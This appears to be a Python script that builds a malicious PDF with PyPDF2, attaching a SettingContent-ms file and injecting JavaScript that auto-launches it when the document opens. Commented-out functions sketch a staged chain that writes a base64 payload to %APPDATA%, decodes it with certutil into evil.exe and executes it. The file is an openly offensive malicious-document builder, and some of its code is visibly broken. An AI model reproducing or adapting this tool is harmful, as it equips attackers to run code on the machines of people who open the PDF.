from PyPDF2 import PdfFileWriter, PdfFileReader
import sys

class PInPdf:
	def __init__(self):
		self.a =''

	def injectJs(self):
		mal_pdf = PdfFileWriter()
		with open("test.pdf", "rb") as f:
			pdf = PdfFileReader(f)
			for page in range(pdf.numPages):
				p = pdf.getPage(page)
				print(p)
				mal_pdf.addPage(p)
			mal_pdf.addJS("this.exportDataObject( {cName: File.SettingContent-ms\", nLaunch: 2} );")
		f.close()
		return mal_pdf
	"""
	def isBase64(payload, filename):
		isb64 = True
		if(filename.endswith('.b64')):
			try:
				base64.b64decode(payload)
			except binascii.Error:
				isb64 = False
		else:
			isb64 = False
		return isb64

	def create_putfile(payload):
		with open("SettingContent-ms.txt", "r") as f:
			scm = f.read()
			putfile = scm.split("\n")
			putfile[5] = "<DeepLink>echo " + payload +"\" > %APPDATA%\evil.b64 \n</DeepLink>"
			return "\n".join(putfile)

	def create_decodefile():
		with open("SettingContent-ms.txt", "r") as f:
			scm = f.read()
			psFile = scm.split("\n")
			psFile[5] = "<DeepLink>certutil -decode %APPDATA%\evil.b64 %APPDATA%\evil.exe</DeepLink>"
			return "\n".join(putfile)

	def create_execfile():
		with open("SettingContent-ms.txt", "r") as f:
			scm = f.read()
			psFile = scm.split("\n")
			psFile[5] = "<DeepLink>%APPDATA%\evil.exe</DeepLink>"
			return "\n".join(putfile)
"""
	def start(self):
		"""
		try:
			opts, args = getopt(argv, "hi:o:",["ifile=","ofile="])
		except getop.GetoptError:
			print('PayloadInPdf.py -i <input file> -o <output file>')
			sys.exit(2)
		if opt == '-h':
			print('PayloadInPdf.py -i <input file> -o <output file>')
			sys.exit()
		elif opt in ("-i", "--ifile"):
			inputarg = arg
		elif opt in ("-o", "--ofile"):
			outputarg = arg
		raw_payload = ""
		with open(args.payload, "rb") as payload:
			raw_payload = payload.read()
		payload.close()
		putFile = create_putfile(payload)
		decodeFile = create_decodefile()
		execFile = create_execfile()
		files = [putfile, decodeFile, execFile]
		fileNames = ["Payload.SettingContent-ms", "Decode.SettingContent-ms", "Exec.SettingContent-ms"]
		"""
		mal_put = PdfFileWriter()
		with open("SettingContent-ms.txt", "rb") as f:
			scm = f.read()
			print("SCM file read...\n")
			print(scm)
			mal_put.addAttachment("File.SettingContent-ms", scm)
			print("SCM file attacheed...")
			with open("test.pdf", "rb") as f:
				pdf = PdfFileReader(f)
				for page in range(pdf.numPages):
					p = pdf.getPage(page)
					mal_put.addPage(p)
				mal_put.addJS("this.exportDataObject( {cName: File.SettingContent-ms\", nLaunch: 2} );")
				print("JS script injected...")
				out = open("mal.pdf", 'wb')
				mal_put.write(out)
				print("mal.pdf created...")
		"""
		for i in range(len(files)):
			tmp = open(fileNames[i], "w")
			tmp.write(files[i])
			tmp.close()
		"""

if __name__ == "__main__":
	p = PInPdf()
	p.start()
